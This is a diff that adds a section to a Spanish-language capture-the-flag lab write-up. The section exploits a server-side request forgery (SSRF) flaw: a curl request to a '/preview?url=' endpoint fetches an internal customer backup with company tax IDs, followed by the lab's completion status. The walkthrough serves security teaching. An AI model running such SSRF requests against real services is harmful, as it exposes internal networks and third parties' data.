@@ -92,3 +92,45 @@ El server (que **sí** está en `internalnet`) resolvió y fetcheó la intranet,
 nos devolvió su home — incluyendo la lista de enlaces internos. La segmentación
 de red quedó anulada porque un host de la DMZ fetchea URLs arbitrarias.
 
+### R3 — Exfiltración del backup · `FLAG{ssrf_backup_clientes}`
+
+**Recorrido.** La home de la intranet (R2) nos dio el inventario de rutas:
+`/backups/clientes.json` ("temporal, borrar!") y `/salud`. Seguimos el enlace
+del backup, siempre a través del `/preview` (`salidas/r3_backup.txt`):
+
+```
+$ curl -s 'http://phantomcorp/preview?url=http://phantomcorp-intra/backups/clientes.json'
+<h3>Previsualizacion de http://phantomcorp-intra/backups/clientes.json</h3><hr>{
+  "_aviso": "backup temporal pre-migracion. NO deberia ser accesible.",
+  "clientes": [
+    {"id": 1, "empresa": "Aconcagua SRL", "cuit": "30-70998877-1"},
+    {"id": 2, "empresa": "Comechingones SA", "cuit": "30-71554433-6"}
+  ],
+  "integridad": "FLAG{ssrf_backup_clientes}"
+}
+```
+
+**Datos sensibles que acompañaban a la flag.** Un backup de clientes con datos
+de identificación fiscal: razón social y **CUIT** de dos empresas (Aconcagua SRL
+— 30-70998877-1; Comechingones SA — 30-71554433-6). Es información de terceros
+que nunca debió ser alcanzable desde fuera de la red interna.
+
+## 2. Evidencia de progreso
+
+Salida completa de `./ctf status extra` (archivada en
+`evidencia/salidas/status_extra.txt`):
+
+```
+  ╭────────────────────────────────────────────────────────────╮
+  │                    PROGRESO · LAB extra                      │
+  ╰────────────────────────────────────────────────────────────╯
+
+   ✓  R1     El server fetchea por vos: panel interno en localhost
+   ✓  R2     Descubrir la intranet en la red interna
+   ✓  R3     Exfiltrar datos sensibles a traves del SSRF
+
+  ██████████████████████████████  3/3 (100%)
+
+[ OK ] ¡Lab extra COMPLETO! Ponete las pilas con la próxima unidad.
+```
+
